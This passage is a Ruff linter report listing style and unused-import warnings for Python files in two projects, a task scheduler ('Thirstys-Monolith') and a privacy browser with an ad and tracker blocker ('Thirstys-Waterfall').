  | ^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from . import ipc
  |

F401 [*] `.errors.TaskExecutionError` imported but unused
  --> external\Thirstys-Monolith\src\monolith\scheduler.py:8:21
   |
 7 | from . import ipc
 8 | from .errors import TaskExecutionError
   |                     ^^^^^^^^^^^^^^^^^^
 9 | from .logging import get_logger
10 | from .memory import MemoryPool
   |
help: Remove unused import: `.errors.TaskExecutionError`

UP037 [*] Remove quotes from type annotation
  --> external\Thirstys-Monolith\src\monolith\scheduler.py:37:23
   |
35 |     def __init__(
36 |         self,
37 |         result_queue: "Queue[ipc.Message]",
   |                       ^^^^^^^^^^^^^^^^^^^^
38 |         quantum_ms: int = 10,
39 |         memory_pool_bytes: int = 64 * 1024 * 1024,
   |
help: Remove quotes

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Monolith\src\monolith\scheduler.py:41:22
   |
39 |         memory_pool_bytes: int = 64 * 1024 * 1024,
40 |     ) -> None:
41 |         self._tasks: List[Task] = []
   |                      ^^^^
42 |         self._result_queue = result_queue
43 |         self._quantum_ms = quantum_ms
   |
help: Replace with `list`

F401 [*] `signal` imported but unused
 --> external\Thirstys-Monolith\src\monolith\supervisor.py:4:8
  |
3 | import os
4 | import signal
  |        ^^^^^^
5 | import time
6 | from multiprocessing import Process, Queue, get_context
  |
help: Remove unused import: `signal`

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Monolith\src\monolith\supervisor.py:7:1
  |
5 | import time
6 | from multiprocessing import Process, Queue, get_context
7 | from typing import List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 |
9 | from . import ipc
  |

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Monolith\src\monolith\supervisor.py:44:32
   |
42 |     """
43 |
44 |     def __init__(self, config: Optional[MonolithConfig] = None) -> None:
   |                                ^^^^^^^^^^^^^^^^^^^^^^^^
45 |         self._cfg = config or load_config()
46 |         configure_logging(self._cfg.log_level)
   |
help: Convert to `X | None`

UP037 [*] Remove quotes from type annotation
  --> external\Thirstys-Monolith\src\monolith\supervisor.py:49:27
   |
48 |         ctx = get_context("spawn")
49 |         self._task_queue: "Queue[ipc.Message]" = ctx.Queue()
   |                           ^^^^^^^^^^^^^^^^^^^^
50 |         self._result_queue: "Queue[ipc.Message]" = ctx.Queue()
51 |         self._workers: List[Process] = []
   |
help: Remove quotes

UP037 [*] Remove quotes from type annotation
  --> external\Thirstys-Monolith\src\monolith\supervisor.py:50:29
   |
48 |         ctx = get_context("spawn")
49 |         self._task_queue: "Queue[ipc.Message]" = ctx.Queue()
50 |         self._result_queue: "Queue[ipc.Message]" = ctx.Queue()
   |                             ^^^^^^^^^^^^^^^^^^^^
51 |         self._workers: List[Process] = []
52 |         self._started = False
   |
help: Remove quotes

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Monolith\src\monolith\supervisor.py:51:24
   |
49 |         self._task_queue: "Queue[ipc.Message]" = ctx.Queue()
50 |         self._result_queue: "Queue[ipc.Message]" = ctx.Queue()
51 |         self._workers: List[Process] = []
   |                        ^^^^
52 |         self._started = False
   |
help: Replace with `list`

SIM105 Use `contextlib.suppress(ipc.IPCError)` instead of `try`-`except`-`pass`
   --> external\Thirstys-Monolith\src\monolith\supervisor.py:99:13
    |
 97 |           )
 98 |           for _ in self._workers:
 99 | /             try:
100 | |                 ipc.send(self._task_queue, shutdown_msg, timeout=2.0)
101 | |             except ipc.IPCError:
102 | |                 pass
    | |____________________^
103 |
104 |           deadline = time.time() + timeout
    |
help: Replace `try`-`except`-`pass` with `with contextlib.suppress(ipc.IPCError): ...`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Monolith\src\monolith\supervisor.py:145:10
    |
143 |         timeout: float = 0.1,
144 |         max_results: int = 100,
145 |     ) -> List[dict]:
    |          ^^^^
146 |         """Drain up to max_results task results from the result queue.
    |
help: Replace with `list`

UP037 [*] Remove quotes from type annotation
   --> external\Thirstys-Monolith\src\monolith\supervisor.py:175:28
    |
173 |         return self._started and all(p.is_alive() for p in self._workers)
174 |
175 |     def __enter__(self) -> "Supervisor":
    |                            ^^^^^^^^^^^^
176 |         self.start()
177 |         return self
    |
help: Remove quotes

F401 [*] `.metrics.METRICS` imported but unused
 --> external\Thirstys-Monolith\src\monolith\worker.py:8:22
  |
6 | from .config import MonolithConfig, load_config
7 | from .logging import configure_logging, get_logger
8 | from .metrics import METRICS, start_metrics_server
  |                      ^^^^^^^
9 | from .scheduler import Scheduler
  |
help: Remove unused import: `.metrics.METRICS`

UP037 [*] Remove quotes from type annotation
  --> external\Thirstys-Monolith\src\monolith\worker.py:15:17
   |
14 | def worker_main(
15 |     task_queue: "Queue[ipc.Message]",
   |                 ^^^^^^^^^^^^^^^^^^^^
16 |     result_queue: "Queue[ipc.Message]",
17 |     config: MonolithConfig | None = None,
   |
help: Remove quotes

UP037 [*] Remove quotes from type annotation
  --> external\Thirstys-Monolith\src\monolith\worker.py:16:19
   |
14 | def worker_main(
15 |     task_queue: "Queue[ipc.Message]",
16 |     result_queue: "Queue[ipc.Message]",
   |                   ^^^^^^^^^^^^^^^^^^^^
17 |     config: MonolithConfig | None = None,
18 | ) -> None:
   |
help: Remove quotes

UP015 [*] Unnecessary mode argument
  --> external\Thirstys-Monolith\tests\test_codex_deus_maximus.py:56:34
   |
55 |             # Verify content was fixed
56 |             with open(test_file, "r") as f:
   |                                  ^^^
57 |                 content = f.read()
   |
help: Remove mode argument

UP015 [*] Unnecessary mode argument
  --> external\Thirstys-Monolith\tests\test_codex_deus_maximus.py:78:34
   |
77 |             # Verify content was fixed
78 |             with open(test_file, "r") as f:
   |                                  ^^^
79 |                 content = f.read()
   |
help: Remove mode argument

F401 [*] `unittest.mock.MagicMock` imported but unused
 --> external\Thirstys-Monolith\tests\test_ipc.py:4:27
  |
3 | import queue
4 | from unittest.mock import MagicMock, patch
  |                           ^^^^^^^^^
5 |
6 | import pytest
  |
help: Remove unused import

F401 [*] `unittest.mock.patch` imported but unused
 --> external\Thirstys-Monolith\tests\test_ipc.py:4:38
  |
3 | import queue
4 | from unittest.mock import MagicMock, patch
  |                                      ^^^^^
5 |
6 | import pytest
  |
help: Remove unused import

F401 [*] `monolith.errors.TaskExecutionError` imported but unused
 --> external\Thirstys-Monolith\tests\test_scheduler.py:7:29
  |
5 | import pytest
6 |
7 | from monolith.errors import TaskExecutionError
  |                             ^^^^^^^^^^^^^^^^^^
8 | from monolith.models import TaskState
9 | from monolith.scheduler import Scheduler
  |
help: Remove unused import: `monolith.errors.TaskExecutionError`

F401 [*] `unittest.mock.MagicMock` imported but unused
 --> external\Thirstys-Monolith\tests\test_supervisor.py:3:27
  |
1 | from __future__ import annotations
2 |
3 | from unittest.mock import MagicMock, patch
  |                           ^^^^^^^^^
4 |
5 | import pytest
  |
help: Remove unused import: `unittest.mock.MagicMock`

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
  --> external\Thirstys-Monolith\tests\test_supervisor.py:26:9
   |
24 |       def test_start_and_stop(self, cfg: MonolithConfig) -> None:
25 |           """Supervisor spawns workers and stops cleanly."""
26 | /         with patch("monolith.supervisor.HealthServer"):
27 | |             with patch("monolith.supervisor.start_metrics_server"):
   | |___________________________________________________________________^
28 |                   sup = Supervisor(config=cfg)
29 |                   sup.start()
   |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
  --> external\Thirstys-Monolith\tests\test_supervisor.py:37:9
   |
36 |       def test_double_start_raises(self, cfg: MonolithConfig) -> None:
37 | /         with patch("monolith.supervisor.HealthServer"):
38 | |             with patch("monolith.supervisor.start_metrics_server"):
   | |___________________________________________________________________^
39 |                   sup = Supervisor(config=cfg)
40 |                   sup.start()
   |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
  --> external\Thirstys-Monolith\tests\test_supervisor.py:48:9
   |
47 |       def test_context_manager(self, cfg: MonolithConfig) -> None:
48 | /         with patch("monolith.supervisor.HealthServer"):
49 | |             with patch("monolith.supervisor.start_metrics_server"):
   | |___________________________________________________________________^
50 |                   with Supervisor(config=cfg) as sup:
51 |                       assert sup._started
   |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
  --> external\Thirstys-Monolith\tests\test_supervisor.py:63:9
   |
61 |       def test_submit_and_collect_result(self, cfg: MonolithConfig) -> None:
62 |           """Submit one task and collect a result within 3 seconds."""
63 | /         with patch("monolith.supervisor.HealthServer"):
64 | |             with patch("monolith.supervisor.start_metrics_server"):
   | |___________________________________________________________________^
65 |                   with Supervisor(config=cfg) as sup:
66 |                       sup.submit_task({"meta": {"owner": "test", "priority": 0}})
   |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
  --> external\Thirstys-Monolith\tests\test_supervisor.py:77:9
   |
76 |       def test_collect_returns_empty_when_no_results(self, cfg: MonolithConfig) -> None:
77 | /         with patch("monolith.supervisor.HealthServer"):
78 | |             with patch("monolith.supervisor.start_metrics_server"):
   | |___________________________________________________________________^
79 |                   with Supervisor(config=cfg) as sup:
80 |                       results = sup.collect_results(timeout=0.05)
   |
help: Combine `with` statements

F401 [*] `pytest` imported but unused
 --> external\Thirstys-Monolith\tests\test_worker.py:3:8
  |
1 | from __future__ import annotations
2 |
3 | import pytest
  |        ^^^^^^
4 |
5 | from monolith.models import Task, TaskMetadata, TaskState
  |
help: Remove unused import: `pytest`

SIM115 Use a context manager for opening files
   --> external\Thirstys-Waterfall\examples\dos_trap_demo.py:352:17
    |
350 |     import tempfile
351 |
352 |     test_file = tempfile.NamedTemporaryFile(delete=False)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^
353 |     test_file.write(b"Sensitive data that must be securely deleted" * 100)
354 |     test_file.close()
    |

UP032 [*] Use f-string instead of `format` call
  --> external\Thirstys-Waterfall\examples\swarm_demo_simple.py:87:7
   |
85 | print()
86 |
87 | print("≡ƒôï ATTACKER'S VIEW (First 10 of {})".format(decoys))
   |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
88 | for i in range(1, 11):
89 |     print(f"   {i:2d}. admin{i}.example.com/login")
   |
help: Convert to f-string

UP015 [*] Unnecessary mode argument
 --> external\Thirstys-Waterfall\setup.py:8:24
  |
6 | from setuptools import find_packages, setup
7 |
8 | with open("README.md", "r", encoding="utf-8") as fh:
  |                        ^^^
9 |     long_description = fh.read()
  |
help: Remove mode argument

SIM118 Use `key in dict` instead of `key in dict.keys()`
  --> external\Thirstys-Waterfall\tests\test_browser.py:98:13
   |
96 |         # Verify cache uses hashed keys (since encryption is non-deterministic)
97 |         self.assertGreater(len(self.search_engine._encrypted_cache), 0)
98 |         for key in self.search_engine._encrypted_cache.keys():
   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
99 |             self.assertIsInstance(key, str)  # Hash strings as cache keys
   |
help: Remove `.keys()`

F401 [*] `unittest.mock.Mock` imported but unused
  --> external\Thirstys-Waterfall\tests\test_consigliere.py:8:27
   |
 6 | import time
 7 | import unittest
 8 | from unittest.mock import Mock, patch
   |                           ^^^^
 9 |
10 | from cryptography.fernet import Fernet
   |
help: Remove unused import

F401 [*] `unittest.mock.patch` imported but unused
  --> external\Thirstys-Waterfall\tests\test_consigliere.py:8:33
   |
 6 | import time
 7 | import unittest
 8 | from unittest.mock import Mock, patch
   |                                 ^^^^^
 9 |
10 | from cryptography.fernet import Fernet
   |
help: Remove unused import

UP015 [*] Unnecessary mode argument
   --> external\Thirstys-Waterfall\tests\test_dos_trap.py:410:30
    |
408 |         )
409 |
410 |         with open(demo_file, "r") as f:
    |                              ^^^
411 |             content = f.read()
    |
help: Remove mode argument

UP015 [*] Unnecessary mode argument
   --> external\Thirstys-Waterfall\tests\test_dos_trap.py:438:30
    |
436 |         )
437 |
438 |         with open(demo_file, "r") as f:
    |                              ^^^
439 |             content = f.read()
    |
help: Remove mode argument

UP015 [*] Unnecessary mode argument
   --> external\Thirstys-Waterfall\tests\test_dos_trap.py:480:35
    |
478 |         )
479 |
480 |         with open(gitignore_file, "r") as f:
    |                                   ^^^
481 |             content = f.read()
    |
help: Remove mode argument

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> external\Thirstys-Waterfall\tests\test_microvm_isolation.py:120:9
    |
119 |           # Mock channel connection
120 | /         with patch.object(self.vm._channel, "connect", return_value=True):
121 | |             with patch.object(self.vm._channel, "send_message", return_value=True):
    | |___________________________________________________________________________________^
122 |                   with patch.object(
123 |                       self.vm._channel, "receive_message", return_value={"type": "pong"}
    |
help: Combine `with` statements

B007 Loop control variable `i` not used within loop body
   --> external\Thirstys-Waterfall\tests\test_microvm_isolation.py:204:13
    |
202 |         vms = []
203 |
204 |         for i in range(10):
    |             ^
205 |             vm_id = self.manager.create_vm(
206 |                 isolation_type=IsolationType.BROWSER_TAB,
    |
help: Rename unused `i` to `_i`

UP015 [*] Unnecessary mode argument
   --> external\Thirstys-Waterfall\tests\test_privacy_ledger.py:528:32
    |
527 |         # Verify export format
528 |         with open(export_path, "r") as f:
    |                                ^^^
529 |             export_data = json.load(f)
    |
help: Remove mode argument

UP035 `typing.Set` is deprecated, use `set` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\ad_database.py:6:1
  |
5 | import logging
6 | from typing import Set
  | ^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\ad_database.py:27:46
   |
25 |         self.cryptomining_domains = self._load_cryptomining_list()
26 |
27 |     def _load_comprehensive_ad_list(self) -> Set[str]:
   |                                              ^^^
28 |         """Load comprehensive ad domain list (1000+ domains)"""
29 |         # Major ad networks (expanded)
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\ad_database.py:53:42
   |
51 |         return major_networks
52 |
53 |     def _load_malvertising_list(self) -> Set[str]:
   |                                          ^^^
54 |         """Load malicious advertising domains"""
55 |         return {
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\ad_database.py:64:42
   |
62 |         }
63 |
64 |     def _load_cryptomining_list(self) -> Set[str]:
   |                                          ^^^
65 |         """Load cryptomining domains"""
66 |         return {
   |
help: Replace with `set`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:8:1
  |
6 | import logging
7 | import re
8 | from typing import Any, Dict, List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:8:1
  |
6 | import logging
7 | import re
8 | from typing import Any, Dict, List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Set` is deprecated, use `set` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:8:1
  |
6 | import logging
7 | import re
8 | from typing import Any, Dict, List, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:36:32
   |
34 |     """
35 |
36 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
37 |         self.config = config
38 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:90:35
   |
88 |         self._active = False
89 |
90 |     def _load_ad_domains(self) -> Set[str]:
   |                                   ^^^
91 |         """Load comprehensive ad domain blocklist"""
92 |         return {
   |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:159:36
    |
157 |         }
158 |
159 |     def _load_ad_patterns(self) -> List[re.Pattern]:
    |                                    ^^^^
160 |         """Load regex patterns for ad detection"""
161 |         patterns = [
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:195:37
    |
193 |         return [re.compile(p, re.IGNORECASE) for p in patterns]
194 |
195 |     def _load_ad_selectors(self) -> List[str]:
    |                                     ^^^^
196 |         """Load CSS selectors for ad elements"""
197 |         return [
    |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:248:40
    |
246 |         ]
247 |
248 |     def _load_tracker_domains(self) -> Set[str]:
    |                                        ^^^
249 |         """Load tracker domain blocklist"""
250 |         return {
    |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:287:45
    |
285 |         }
286 |
287 |     def _load_malvertising_domains(self) -> Set[str]:
    |                                             ^^^
288 |         """Load malicious advertising domains"""
289 |         return {
    |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:298:38
    |
296 |         }
297 |
298 |     def check_url(self, url: str) -> Dict[str, Any]:
    |                                      ^^^^
299 |         """
300 |         Check if URL should be blocked (HOLY WAR analysis).
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:379:10
    |
377 |     def check_element(
378 |         self, element_html: str, element_class: str, element_id: str
379 |     ) -> Dict[str, Any]:
    |          ^^^^
380 |         """
381 |         Check if HTML element is an ad (HOLY WAR analysis).
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:512:28
    |
510 |         return True  # ALWAYS KILL AUTOPLAY
511 |
512 |     def get_stats(self) -> Dict[str, Any]:
    |                            ^^^^
513 |         """Get ad blocking statistics"""
514 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\holy_war_engine.py:530:29
    |
528 |         }
529 |
530 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
531 |         """Get ad annihilator status"""
532 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\tracker_destroyer.py:6:1
  |
5 | import logging
6 | from typing import Any, Dict, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Set` is deprecated, use `set` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\tracker_destroyer.py:6:1
  |
5 | import logging
6 | from typing import Any, Dict, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\tracker_destroyer.py:30:34
   |
28 |         self.destroyed_count = 0
29 |
30 |     def _load_analytics(self) -> Set[str]:
   |                                  ^^^
31 |         """Load analytics trackers"""
32 |         return {
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\tracker_destroyer.py:43:40
   |
41 |         }
42 |
43 |     def _load_social_trackers(self) -> Set[str]:
   |                                        ^^^
44 |         """Load social media trackers"""
45 |         return {
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\tracker_destroyer.py:54:36
   |
52 |         }
53 |
54 |     def _load_ad_trackers(self) -> Set[str]:
   |                                    ^^^
55 |         """Load advertising trackers"""
56 |         return {
   |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\tracker_destroyer.py:65:44
   |
63 |         }
64 |
65 |     def destroy_tracker(self, url: str) -> Dict[str, Any]:
   |                                            ^^^^
66 |         """Destroy a tracker"""
67 |         url_lower = url.lower()
   |
help: Replace with `dict`

SIM110 Use `return any(tracker in url_lower for tracker in self._tracker_domains)` instead of `for` loop
  --> external\Thirstys-Waterfall\thirstys_waterfall\ad_annihilator\tracker_destroyer.py:89:9
   |
87 |           """Determine if URL should be blocked as tracker"""
88 |           url_lower = url.lower()
89 | /         for tracker in self._tracker_domains:
90 | |             if tracker in url_lower:
91 | |                 return True
92 | |         return False
   | |____________________^
   |
help: Replace with `return any(tracker in url_lower for tracker in self._tracker_domains)`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:8:1
   |
 6 | import logging
 7 | import time
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from cryptography.fernet import Fernet
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:8:1
   |
 6 | import logging
 7 | import time
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from cryptography.fernet import Fernet
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:26:32
   |
24 |     """
25 |
26 |     def __init__(self, config: Dict[str, Any], god_tier_encryption):
   |                                ^^^^
27 |         self.config = config
28 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:48:24
   |
47 |         # Encrypted context window
48 |         self._context: List[Dict[str, Any]] = []
   |                        ^^^^
49 |         self._max_context = config.get("max_context", 20)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:48:29
   |
47 |         # Encrypted context window
48 |         self._context: List[Dict[str, Any]] = []
   |                             ^^^^
49 |         self._max_context = config.get("max_context", 20)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:52:37
   |
51 |         # Conversation history (encrypted, ephemeral)
52 |         self._conversation_history: List[Dict[str, Any]] = []
   |                                     ^^^^
53 |
54 |         self._active = False
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:52:42
   |
51 |         # Conversation history (encrypted, ephemeral)
52 |         self._conversation_history: List[Dict[str, Any]] = []
   |                                          ^^^^
53 |
54 |         self._active = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:75:36
   |
74 |     def ask(
75 |         self, query: str, context: Optional[Dict[str, Any]] = None
   |                                    ^^^^^^^^^^^^^^^^^^^^^^^^
76 |     ) -> Dict[str, Any]:
77 |         """
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:75:45
   |
74 |     def ask(
75 |         self, query: str, context: Optional[Dict[str, Any]] = None
   |                                             ^^^^
76 |     ) -> Dict[str, Any]:
77 |         """
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:76:10
   |
74 |     def ask(
75 |         self, query: str, context: Optional[Dict[str, Any]] = None
76 |     ) -> Dict[str, Any]:
   |          ^^^^
77 |         """
78 |         Ask the AI assistant a question.
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:117:36
    |
116 |     def _process_with_local_ai(
117 |         self, query: str, context: Optional[Dict[str, Any]]
    |                                    ^^^^^^^^^^^^^^^^^^^^^^^^
118 |     ) -> Dict[str, Any]:
119 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:117:45
    |
116 |     def _process_with_local_ai(
117 |         self, query: str, context: Optional[Dict[str, Any]]
    |                                             ^^^^
118 |     ) -> Dict[str, Any]:
119 |         """
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:118:10
    |
116 |     def _process_with_local_ai(
117 |         self, query: str, context: Optional[Dict[str, Any]]
118 |     ) -> Dict[str, Any]:
    |          ^^^^
119 |         """
120 |         Process query with local AI (on-device).
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:203:38
    |
201 |         )
202 |
203 |     def _add_to_context(self, entry: Dict[str, Any]):
    |                                      ^^^^
204 |         """Add to encrypted context window"""
205 |         self._context.append(entry)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:211:43
    |
209 |             self._context.pop(0)
210 |
211 |     def get_conversation_history(self) -> List[Dict[str, Any]]:
    |                                           ^^^^
212 |         """Get encrypted conversation history"""
213 |         return self._conversation_history.copy()
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:211:48
    |
209 |             self._context.pop(0)
210 |
211 |     def get_conversation_history(self) -> List[Dict[str, Any]]:
    |                                                ^^^^
212 |         """Get encrypted conversation history"""
213 |         return self._conversation_history.copy()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\ai_engine.py:220:29
    |
218 |         self.logger.info("Conversation history cleared")
219 |
220 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
221 |         """Get AI assistant status"""
222 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\context_manager.py:6:1
  |
5 | import logging
6 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\context_manager.py:6:1
  |
5 | import logging
6 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\context_manager.py:16:24
   |
14 |         self.god_tier_encryption = god_tier_encryption
15 |         self.max_size = max_size
16 |         self._context: List[Dict[str, Any]] = []
   |                        ^^^^
17 |
18 |     def add(self, entry: Dict[str, Any]):
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\context_manager.py:16:29
   |
14 |         self.god_tier_encryption = god_tier_encryption
15 |         self.max_size = max_size
16 |         self._context: List[Dict[str, Any]] = []
   |                             ^^^^
17 |
18 |     def add(self, entry: Dict[str, Any]):
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\context_manager.py:18:26
   |
16 |         self._context: List[Dict[str, Any]] = []
17 |
18 |     def add(self, entry: Dict[str, Any]):
   |                          ^^^^
19 |         """Add entry to context (encrypted)"""
20 |         self._context.append(entry)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\context_manager.py:24:22
   |
22 |             self._context.pop(0)
23 |
24 |     def get(self) -> List[Dict[str, Any]]:
   |                      ^^^^
25 |         """Get context"""
26 |         return self._context.copy()
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\ai_assistant\context_manager.py:24:27
   |
22 |             self._context.pop(0)
23 |
24 |     def get(self) -> List[Dict[str, Any]]:
   |                           ^^^^
25 |         """Get context"""
26 |         return self._context.copy()
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\browser\browser_engine.py:4:1
  |
3 | import logging
4 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | from cryptography.fernet import Fernet
  |

